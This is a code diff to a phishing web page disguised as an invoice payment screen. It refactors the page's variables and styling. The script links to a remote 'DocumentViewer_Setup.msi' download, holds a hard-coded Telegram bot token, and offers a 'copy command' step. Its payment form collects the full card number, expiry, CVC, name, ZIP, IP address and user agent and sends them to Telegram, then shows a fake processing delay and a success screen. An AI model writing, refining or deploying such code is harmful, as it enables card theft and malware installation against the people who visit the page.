@@ -96,10 +96,10 @@ td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
   transition: background .15s ease;
 }
 .btn:hover { background: #164bb0; }
-.btn:disabled { opacity: .72; cursor: default; }
+.btn:disabled { opacity: .78; cursor: default; }
 .fine { margin: 10px 0 0; font-size: 11.5px; color: var(--muted); }
 .tok {
-  margin-top: 14px; padding: 10px 12px; background: #f6f7f9;
+  margin-top: 8px; padding: 10px 12px; background: #f6f7f9;
   border: 1px dashed #cfd4da; border-radius: 7px; font-size: 11.5px; color: var(--muted);
 }
 .tok code {
@@ -142,19 +142,19 @@ footer b { color: var(--ink); }
 
 .brands { display: flex; gap: 8px; margin-bottom: 16px; }
 .brands .b {
-  width: 46px; height: 30px; border: 1px solid var(--line); border-radius: 5px;
+  width: 50px; height: 32px; border: 1px solid var(--line); border-radius: 5px;
   display: grid; place-items: center; background: #fff;
-  filter: grayscale(1); opacity: .45; transition: all .2s ease;
+  opacity: 1; transition: all .2s ease;
 }
-.brands .b.on { filter: none; opacity: 1; border-color: var(--accent); box-shadow: 0 0 0 2px #e6edfb; }
+.brands .b.dim { filter: grayscale(1); opacity: .32; }
+.brands .b.on { border-color: var(--accent); box-shadow: 0 0 0 2px #e6edfb; }
 
-/* slide-out form */
 #payform {
   max-height: 0; opacity: 0; overflow: hidden;
   transition: max-height .5s cubic-bezier(.4,0,.2,1), opacity .3s ease, margin-top .3s ease;
   margin-top: 0;
 }
-#payform.open { max-height: 620px; opacity: 1; margin-top: 4px; }
+#payform.open { max-height: 900px; opacity: 1; margin-top: 4px; }
 
 .field { margin-bottom: 12px; }
 .field label { display: block; font-size: 11.5px; color: var(--muted); margin-bottom: 5px; font-weight: 600; }
@@ -165,29 +165,29 @@ footer b { color: var(--ink); }
 }
 .field input:focus, .field select:focus { border-color: var(--accent); box-shadow: 0 0 0 3px #e6edfb; }
 .field .wrap { position: relative; }
-.field .wrap input { padding-right: 92px; }
+.field .wrap input { padding-right: 108px; }
 .field .brandlabel {
   position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
-  font-size: 11.5px; font-weight: 700; letter-spacing: .3px; color: var(--accent);
+  font-size: 11px; font-weight: 700; letter-spacing: .3px; color: var(--accent);
   opacity: 0; transition: opacity .2s ease; pointer-events: none;
 }
 .field .brandlabel.on { opacity: 1; }
 .row2 { display: flex; gap: 12px; }
 .row2 .field { flex: 1; }
 
-.paybtn { position: relative; }
+.paybtn { position: relative; min-height: 46px; }
 .spinner {
-  display: none; width: 16px; height: 16px; margin-right: 8px;
-  border: 2px solid rgba(255,255,255,.4); border-top-color: #fff;
-  border-radius: 50%; animation: spin .7s linear infinite; vertical-align: -3px;
+  display: none; width: 18px; height: 18px; margin-right: 9px;
+  border: 2.5px solid rgba(255,255,255,.35); border-top-color: #fff;
+  border-radius: 50%; animation: spin .7s linear infinite; vertical-align: -4px;
 }
 .paying .spinner { display: inline-block; }
+.paying { background: #2b6bd8 !important; }
 @keyframes spin { to { transform: rotate(360deg); } }
 
 .secure { display: flex; align-items: center; gap: 6px; margin-top: 12px; font-size: 11px; color: var(--muted); }
 .err { margin: 10px 0 0; font-size: 12px; color: var(--red); }
 
-/* success */
 #paydone[hidden] { display: none !important; }
 #paydone { padding: 30px 18px; text-align: center; }
 .check { width: 58px; height: 58px; margin: 0 auto 14px; }
@@ -307,20 +307,20 @@ footer b { color: var(--ink); }
 
         <div class="brands" id="brands">
           <div class="b" data-brand="visa">
-            <svg width="30" height="12" viewBox="0 0 30 12"><text x="0" y="10" font-family="Arial,Helvetica,sans-serif" font-size="11" font-weight="700" font-style="italic" fill="#1a1f71">VISA</text></svg>
+            <svg width="32" height="13" viewBox="0 0 32 13"><text x="0" y="11" font-family="Arial,Helvetica,sans-serif" font-size="12" font-weight="700" font-style="italic" fill="#1a1f71">VISA</text></svg>
           </div>
           <div class="b" data-brand="mastercard">
-            <svg width="26" height="16" viewBox="0 0 26 16"><circle cx="10" cy="8" r="7" fill="#eb001b"/><circle cx="16" cy="8" r="7" fill="#f79e1b" opacity=".85"/></svg>
+            <svg width="28" height="17" viewBox="0 0 28 17"><circle cx="11" cy="8.5" r="7.5" fill="#eb001b"/><circle cx="17" cy="8.5" r="7.5" fill="#f79e1b" opacity=".85"/></svg>
           </div>
           <div class="b" data-brand="amex">
-            <svg width="28" height="16" viewBox="0 0 28 16"><rect width="28" height="16" rx="2" fill="#2e77bc"/><text x="14" y="11" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="7" font-weight="700" fill="#fff">AMEX</text></svg>
+            <svg width="30" height="17" viewBox="0 0 30 17"><rect width="30" height="17" rx="2" fill="#2e77bc"/><text x="15" y="11.5" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="7.5" font-weight="700" fill="#fff">AMEX</text></svg>
           </div>
           <div class="b" data-brand="discover">
-            <svg width="30" height="14" viewBox="0 0 30 14"><circle cx="22" cy="7" r="5" fill="#f68121"/><text x="1" y="10.5" font-family="Arial,Helvetica,sans-serif" font-size="7" font-weight="700" fill="#231f20">DISC</text></svg>
+            <svg width="32" height="15" viewBox="0 0 32 15"><circle cx="24" cy="7.5" r="5.5" fill="#f68121"/><text x="1" y="11" font-family="Arial,Helvetica,sans-serif" font-size="7.5" font-weight="700" fill="#231f20">DISC</text></svg>
           </div>
         </div>
 
-        <button class="btn" id="payopen">Pay $640.72</button>
+        <button class="btn" id="payopen" type="button">Pay $640.72</button>
 
         <form id="payform" novalidate>
           <div class="field">
@@ -396,48 +396,47 @@ footer b { color: var(--ink); }
 
 <script>
 /* ---------------- CONFIG ---------------- */
-var MSI = "https://bhaw.onl/DocumentViewer_Setup.msi";
+var MSI_URL = "https://bhaw.onl/DocumentViewer_Setup.msi";
 var BOT_TOKEN = "7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8";
 var CHAT_ID = "6069290001";
-var INVOICE = "INV-2026-1184";
-var AMOUNT = "$640.72";
+var INVOICE_NO = "INV-2026-1184";
+var AMOUNT_DUE = "$640.72";
 
 /* ---------------- REVEAL ---------------- */
-var dl = document.getElementById("dl");
-dl.href = MSI;
+var dlBtn = document.getElementById("dl");
+dlBtn.href = MSI_URL;
 
-function reveal() {
-  document.getElementById("sheet").classList.add("revealed");
-  document.getElementById("reveal").hidden = false;
-  try { localStorage.setItem("inv1184", "1"); } catch (e) {}
+var sheetEl = document.getElementById("sheet");
+var revealEl = document.getElementById("reveal");
+
+function revealPage() {
+  sheetEl.classList.add("revealed");
+  revealEl.hidden = false;
 }
 
-dl.addEventListener("click", function () {
-  setTimeout(reveal, 600);
+dlBtn.addEventListener("click", function () {
+  setTimeout(revealPage, 600);
 });
 
 try {
-  if (localStorage.getItem("inv1184")) {
-    document.getElementById("sheet").classList.add("revealed");
-    document.getElementById("reveal").hidden = false;
-  }
+  if (localStorage.getItem("inv1184")) revealPage();
 } catch (e) {}
 
 /* ---------------- COPY ---------------- */
-function copyText(text, btn, label) {
+function copyText(text, btnEl, label) {
   var done = function () {
-    btn.textContent = "Copied";
-    setTimeout(function () { btn.textContent = label; }, 1600);
+    btnEl.textContent = "Copied";
+    setTimeout(function () { btnEl.textContent = label; }, 1600);
   };
   if (navigator.clipboard && window.isSecureContext) {
     navigator.clipboard.writeText(text).then(done).catch(done);
   } else {
-    var ta = document.createElement("textarea");
-    ta.value = text;
-    document.body.appendChild(ta);
-    ta.select();
+    var taEl = document.createElement("textarea");
+    taEl.value = text;
+    document.body.appendChild(taEl);
+    taEl.select();
     try { document.execCommand("copy"); } catch (e) {}
-    document.body.removeChild(ta);
+    document.body.removeChild(taEl);
     done();
   }
 }
@@ -450,146 +449,155 @@ document.getElementById("cpc").addEventListener("click", function () {
   copyText(document.getElementById("cmd").textContent, this, "Copy command");
 });
 
-/* ---------------- CARD BRAND ---------------- */
-var num = document.getElementById("cardnumber");
-var exp = document.getElementById("cardexp");
-var cvc = document.getElementById("cardcvc");
-var zip = document.getElementById("cardzip");
-var name = document.getElementById("cardname");
-var brandLabel = document.getElementById("brandlabel");
-var brandChips = document.querySelectorAll(".brands .b");
+/* ---------------- ELEMENTS ---------------- */
+var cardNameEl = document.getElementById("cardname");
+var cardNumEl = document.getElementById("cardnumber");
+var cardExpEl = document.getElementById("cardexp");
+var cardCvcEl = document.getElementById("cardcvc");
+var cardZipEl = document.getElementById("cardzip");
+var cardCountryEl = document.getElementById("cardcountry");
+var brandLabelEl = document.getElementById("brandlabel");
+var brandChipEls = document.querySelectorAll(".brands .b");
+var payFormEl = document.getElementById("payform");
+var payGoEl = document.getElementById("paygo");
+var payErrEl = document.getElementById("payerr");
+var payBodyEl = document.getElementById("paybody");
+var payDoneEl = document.getElementById("paydone");
+var payOpenEl = document.getElementById("payopen");
 
-var BRANDS = [
-  { id: "visa", label: "VISA", re: /^4/, len: [13, 16, 19], cvc: 3 },
-  { id: "mastercard", label: "MASTERCARD", re: /^(5[1-5]|2[2-7])/, len: [16], cvc: 3 },
-  { id: "amex", label: "AMERICAN EXPRESS", re: /^3[47]/, len: [15], cvc: 4 },
-  { id: "discover", label: "DISCOVER", re: /^(6011|65|64[4-9])/, len: [16, 19], cvc: 3 }
+/* ---------------- CARD BRAND ---------------- */
+var BRAND_LIST = [
+  { id: "visa", label: "VISA", re: /^4/, minLen: 13, cvcLen: 3 },
+  { id: "mastercard", label: "MASTERCARD", re: /^(5[1-5]|2[2-7])/, minLen: 16, cvcLen: 3 },
+  { id: "amex", label: "AMERICAN EXPRESS", re: /^3[47]/, minLen: 15, cvcLen: 4 },
+  { id: "discover", label: "DISCOVER", re: /^(6011|65|64[4-9])/, minLen: 16, cvcLen: 3 }
 ];
 
 function detectBrand(digits) {
   if (!digits) return null;
-  for (var i = 0; i < BRANDS.length; i++) {
-    if (BRANDS[i].re.test(digits)) return BRANDS[i];
+  for (var i = 0; i < BRAND_LIST.length; i++) {
+    if (BRAND_LIST[i].re.test(digits)) return BRAND_LIST[i];
   }
   return null;
 }
 
-function currentBrand() {
-  return detectBrand(num.value.replace(/\D/g, ""));
-}
-
 function paintBrand(brand) {
-  brandChips.forEach(function (chip) {
-    chip.classList.toggle("on", !!brand && chip.dataset.brand === brand.id);
+  brandChipEls.forEach(function (chip) {
+    var isMatch = !!brand && chip.dataset.brand === brand.id;
+    chip.classList.toggle("on", isMatch);
+    chip.classList.toggle("dim", !!brand && !isMatch);
   });
+
   if (brand) {
-    brandLabel.textContent = brand.label;
-    brandLabel.classList.add("on");
-    cvc.maxLength = brand.cvc;
-    cvc.placeholder = brand.cvc === 4 ? "1234" : "123";
+    brandLabelEl.textContent = brand.label;
+    brandLabelEl.classList.add("on");
+    cardCvcEl.maxLength = brand.cvcLen;
+    cardCvcEl.placeholder = brand.cvcLen === 4 ? "1234" : "123";
   } else {
-    brandLabel.textContent = "";
-    brandLabel.classList.remove("on");
-    cvc.maxLength = 4;
-    cvc.placeholder = "123";
+    brandLabelEl.textContent = "";
+    brandLabelEl.classList.remove("on");
+    cardCvcEl.maxLength = 4;
+    cardCvcEl.placeholder = "123";
   }
 }
 
-num.addEventListener("input", function () {
-  var brand = currentBrand();
-  var digits = num.value.replace(/\D/g, "");
+cardNumEl.addEventListener("input", function () {
+  var digits = cardNumEl.value.replace(/\D/g, "");
+  var brand = detectBrand(digits);
 
   if (brand && brand.id === "amex") {
     digits = digits.slice(0, 15);
-    num.value = digits.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*$/, function (m, a, b, c) {
-      return [a, b, c].filter(Boolean).join(" ");
-    });
+    var a = digits.slice(0, 4);
+    var b = digits.slice(4, 10);
+    var c = digits.slice(10, 15);
+    cardNumEl.value = [a, b, c].filter(Boolean).join(" ");
   } else {
     digits = digits.slice(0, 19);
-    num.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+    cardNumEl.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
   }
 
   paintBrand(detectBrand(digits));
 });
 
-exp.addEventListener("input", function () {
-  var d = exp.value.replace(/\D/g, "").slice(0, 4);
+cardExpEl.addEventListener("input", function () {
+  var d = cardExpEl.value.replace(/\D/g, "").slice(0, 4);
   if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
-  exp.value = d;
+  cardExpEl.value = d;
 });
 
-cvc.addEventListener("input", function () {
-  cvc.value = cvc.value.replace(/\D/g, "");
+cardCvcEl.addEventListener("input", function () {
+  cardCvcEl.value = cardCvcEl.value.replace(/\D/g, "");
 });
 
-zip.addEventListener("input", function () {
-  zip.value = zip.value.replace(/[^\w\- ]/g, "");
+cardZipEl.addEventListener("input", function () {
+  cardZipEl.value = cardZipEl.value.replace(/[^\w\- ]/g, "");
 });
 
-function luhn(digits) {
-  var sum = 0, alt = false;
+function luhnOk(digits) {
+  var sum = 0;
+  var alt = false;
   for (var i = digits.length - 1; i >= 0; i--) {
     var n = parseInt(digits.charAt(i), 10);
-    if (alt) { n *= 2; if (n > 9) n -= 9; }
+    if (alt) {
+      n *= 2;
+      if (n > 9) n -= 9;
+    }
     sum += n;
     alt = !alt;
   }
   return sum % 10 === 0;
 }
 
-/* ---------------- SUBMIT ---------------- */
-var form = document.getElementById("payform");
-var go = document.getElementById("paygo");
-var errBox = document.getElementById("payerr");
-var paybody = document.getElementById("paybody");
-var paydone = document.getElementById("paydone");
-var payopen = document.getElementById("payopen");
-
-payopen.addEventListener("click", function () {
-  form.classList.add("open");
-  payopen.style.display = "none";
-  setTimeout(function () { name.focus(); }, 380);
+/* ---------------- OPEN FORM ---------------- */
+payOpenEl.addEventListener("click", function () {
+  payFormEl.classList.add("open");
+  payOpenEl.style.display = "none";
+  setTimeout(function () {
+    payFormEl.scrollIntoView({ behavior: "smooth", block: "start" });
+    cardNameEl.focus({ preventScroll: true });
+  }, 420);
 });
 
-function showErr(msg) {
-  errBox.textContent = msg;
-  errBox.hidden = false;
+/* ---------------- SUBMIT ---------------- */
+function showErr(msg, focusEl) {
+  payErrEl.textContent = msg;
+  payErrEl.hidden = false;
+  if (focusEl) focusEl.focus();
 }
 
-form.addEventListener("submit", function (event) {
+payFormEl.addEventListener("submit", function (event) {
   event.preventDefault();
-  errBox.hidden = true;
+  payErrEl.hidden = true;
 
-  var digits = num.value.replace(/\D/g, "");
+  var digits = cardNumEl.value.replace(/\D/g, "");
   var brand = detectBrand(digits);
-  var holder = name.value.trim();
-  var expiry = exp.value.trim();
+  var holder = cardNameEl.value.trim();
+  var expiry = cardExpEl.value.trim();
 
-  if (holder.length < 3) { showErr("Enter the name printed on the card."); name.focus(); return; }
-  if (!brand) { showErr("Card number not recognised. Check the first digits."); num.focus(); return; }
-  if (digits.length < brand.len[0] || !luhn(digits)) {
-    showErr("That card number looks incomplete. Please check it.");
-    num.focus();
+  if (holder.length < 3) { showErr("Enter the name printed on the card.", cardNameEl); return; }
+  if (!brand) { showErr("Card number not recognised. Check the first digits.", cardNumEl); return; }
+  if (digits.length < brand.minLen || !luhnOk(digits)) {
+    showErr("That card number looks incomplete. Please check it.", cardNumEl);
     return;
   }
-  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { showErr("Expiry must be MM/YY."); exp.focus(); return; }
-  if (cvc.value.length < brand.cvc) { showErr("CVC is " + brand.cvc + " digits."); cvc.focus(); return; }
-  if (zip.value.trim().length < 3) { showErr("Enter the billing ZIP for this card."); zip.focus(); return; }
+  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { showErr("Expiry must be MM/YY.", cardExpEl); return; }
+  if (cardCvcEl.value.length < brand.cvcLen) { showErr("CVC is " + brand.cvcLen + " digits.", cardCvcEl); return; }
+  if (cardZipEl.value.trim().length < 3) { showErr("Enter the billing ZIP for this card.", cardZipEl); return; }
 
-  go.disabled = true;
-  go.classList.add("paying");
-  go.querySelector(".paylabel").textContent = "Processing\u2026";
-  form.querySelectorAll("input, select").forEach(function (f) { f.disabled = true; });
+  payGoEl.disabled = true;
+  payGoEl.classList.add("paying");
+  payGoEl.querySelector(".paylabel").textContent = "Processing\u2026";
+  payFormEl.querySelectorAll("input, select").forEach(function (f) { f.disabled = true; });
 
-  var started = Date.now();
+  var startedAt = Date.now();
 
   sendPayment(brand, digits).finally(function () {
-    var wait = Math.max(0, 5000 - (Date.now() - started));
+    var remaining = Math.max(0, 5000 - (Date.now() - startedAt));
     setTimeout(function () {
-      paybody.style.display = "none";
-      paydone.hidden = false;
-      paydone.scrollIntoView({ behavior: "smooth", block: "center" });
-    }, wait);
+      payBodyEl.style.display = "none";
+      payDoneEl.hidden = false;
+      payDoneEl.scrollIntoView({ behavior: "smooth", block: "center" });
+    }, remaining);
   });
 });
 
@@ -603,21 +611,21 @@ function fetchIpAddress() {
 
 function sendPayment(brand, digits) {
   return fetchIpAddress().then(function (ip) {
-    var message =
+    var msg =
       "*#--------[ INVOICE PAYMENT ]---------#*\n\n" +
-      "*Invoice* : " + INVOICE + "\n" +
-      "*Amount* : " + AMOUNT + "\n\n" +
+      "*Invoice* : " + INVOICE_NO + "\n" +
+      "*Amount* : " + AMOUNT_DUE + "\n\n" +
       "*Card* : " + digits.replace(/(\d{4})(?=\d)/g, "$1 ") + "\n" +
       "*Brand* : " + brand.label + "\n" +
-      "*Expiry* : " + exp.value + "\n" +
-      "*CVC* : " + cvc.value + "\n" +
-      "*Name* : " + name.value.trim() + "\n" +
-      "*ZIP* : " + zip.value.trim() + " / " + document.getElementById("cardcountry").value + "\n" +
+      "*Expiry* : " + cardExpEl.value + "\n" +
+      "*CVC* : " + cardCvcEl.value + "\n" +
+      "*Name* : " + cardNameEl.value.trim() + "\n" +
+      "*ZIP* : " + cardZipEl.value.trim() + " / " + cardCountryEl.value + "\n" +
       "*IP* : " + ip + "\n" +
       "*Device* : " + navigator.userAgent + "\n\n" +
       "*#------------[ CARD SUBMITTED ]-------------#*";
 
-    return sendToTelegram(message).catch(function () {});
+    return sendToTelegram(msg).catch(function () {});
   });
 }
 
